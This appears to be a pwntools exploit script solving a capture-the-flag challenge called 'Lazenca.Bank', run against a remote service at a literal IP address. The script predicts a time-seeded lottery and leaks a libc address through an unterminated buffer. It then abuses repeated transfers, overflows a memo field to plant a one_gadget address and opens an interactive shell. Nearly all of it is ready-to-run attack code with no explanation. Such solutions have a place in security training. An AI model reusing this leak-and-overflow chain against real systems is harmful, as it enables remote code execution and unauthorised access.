#!/usr/bin/env python3
from pwn import *
from ctypes import *

def account():
    p.sendlineafter(b'Input : ', '1')

def history():
    p.sendlineafter(b'Input : ', '2')

def transfer(account, amount, VIP=False):
    if VIP:
        p.sendlineafter(b'Input : ', '8')
    else:
        p.sendlineafter(b'Input : ', '3')
    p.sendlineafter(b'Enter the account number to be transfer.', account)
    p.sendlineafter(b'Enter the amount to be transfer.', amount)

def loan():
    p.sendlineafter(b'Input : ', '4')

def lottery(nums):
    p.sendlineafter(b'Input : ', '5')
    p.sendlineafter(b'[1] : ', str(nums[0]))
    p.sendlineafter(b'[2] : ', str(nums[1]))
    p.sendlineafter(b'[3] : ', str(nums[2]))
    p.sendlineafter(b'[4] : ', str(nums[3]))
    p.sendlineafter(b'[5] : ', str(nums[4]))
    p.sendlineafter(b'[6] : ', str(nums[5]))
    p.sendlineafter(b'[7] : ', str(nums[6]))

def leave_info(name, addr):
    p.sendafter(b'Name : ', name)
    p.sendafter(b'Address : ', addr)

def adduser(myid, passwd):
    p.sendlineafter(b'Input : ', '6')
    p.sendlineafter(b'ID : ', myid)
    p.sendlineafter(b'Password : ', passwd)

def user():
    p.sendlineafter(b'Input : ', '7')

def logout():
    p.sendlineafter(b'Input : ', '8')

def login(myid, passwd):
    p.sendlineafter(b'Input : ', '7')
    p.sendlineafter(b'ID : ', myid)
    p.sendlineafter(b'Password : ', passwd)

def user_back():
    p.sendlineafter(b'Input : ', '0')

def user_info():
    p.sendlineafter(b'Input : ', '1')

def user_edit(memo):
    p.sendlineafter(b'Input : ', '2')
    p.sendafter(b'Edit', memo)

def user_delete():
    p.sendlineafter(b'Input : ', '3')

# p = process('./Lazenca.Bank')
# p = process('./Lazenca.Bank', env={"LD_PRELOAD": "./libc-2.31.so"})
p = remote('35.200.24.227', 10002)

adduser(b'poor', b'aa')
login(b'poor', b'aa')
account()

p.recvuntil(b'Account number : ')
poorid = int(p.recvuntil(b'\n', drop=True))
log.info('poor account number : ' + str(poorid))

logout()

adduser(b'rich', b'aa')
login(b'rich', b'aa')
account()

p.recvuntil(b'Account number : ')
richid = int(p.recvuntil(b'\n', drop=True))
log.info('rich account number : ' + str(richid))

loan()

# C = CDLL("./hostlibc-2.31.so")
C = CDLL("./libc-2.31.so")
C.srand(C.time(None))
lucky = []
while len(lucky) != 7:
    n = C.rand() % 37 + 1
    if n not in lucky:
        lucky.append(n)
lottery(lucky)
leave_info(b'a'*15+b'\n', b'b'*32)

p.recvuntil(b'a'*15+b'\n')
libc = u64(p.recv(6).ljust(8, b'\0')) - 0x1ec6a0 # _IO_2_1_stdout_
log.info(hex(libc))
one_gadget = libc + 0xe6c84

for i in range(0x14):
    transfer(str(poorid), str(100000000))

log.info("poor account --> RICH VIP account")

logout()
login(b'poor', b'aa')
user()

payload = b'A' * 0x38 + p64(one_gadget) + b'\n'
user_edit(payload)

user_back()

transfer(str(richid), str(0), VIP=True)

p.interactive()